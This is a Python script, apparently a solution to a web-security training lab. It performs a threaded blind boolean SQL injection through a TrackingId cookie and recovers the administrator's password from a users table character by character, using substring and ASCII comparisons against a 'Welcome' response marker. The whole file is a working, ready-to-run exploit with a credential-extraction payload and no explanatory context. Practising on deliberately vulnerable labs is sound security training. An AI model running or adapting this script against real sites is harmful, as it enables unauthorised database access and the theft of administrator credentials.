import sys
import requests
import urllib.parse
import urllib3
from concurrent.futures import ThreadPoolExecutor
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    with ThreadPoolExecutor(max_workers=10) as executor:
        for i in range(1, 21):
            futures = []
            for j in range(32, 127):
                sqli_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"

                sqli_payload_encoded = urllib.parse.quote(sqli_payload)
                cookies = {
                    'TrackingId' : f'sZNDlMxyymhM5K16{sqli_payload_encoded}',
                    'session' : 'mn0fxO6udmczWROQRbxVZp9fWzpC3YZr'
                }
                future = executor.submit(requests.get, url, cookies=cookies, verify=False, proxies=proxies)
                futures.append((future, j))
        
            for future, j in futures:
                r = future.result()
                if "Welcome" not in r.text:
                    sys.stdout.write(f'\r{password_extracted}{chr(j)}')
                    sys.stdout.flush()
                else:
                    password_extracted += chr(j)
                    sys.stdout.write(f'\r{password_extracted}')
                    sys.stdout.flush()
                    break # Exit the loop once a character is found

def main():
    start_time = time.time()
    if len(sys.argv) != 2:
     print(f'[+] Usage: {sys.argv[0]} <url>')
     print(f'[+] Example: {sys.argv[0]} www.example.com')
    else:
     url = sys.argv[1]
     print('[+] Retrieving administrator password..')
     sqli_password(url)
    end_time = time.time()
    print(f'\n[+] Execution time: {(end_time - start_time)/60.0:.2f} minutes') 

if __name__ == '__main__':
    main()
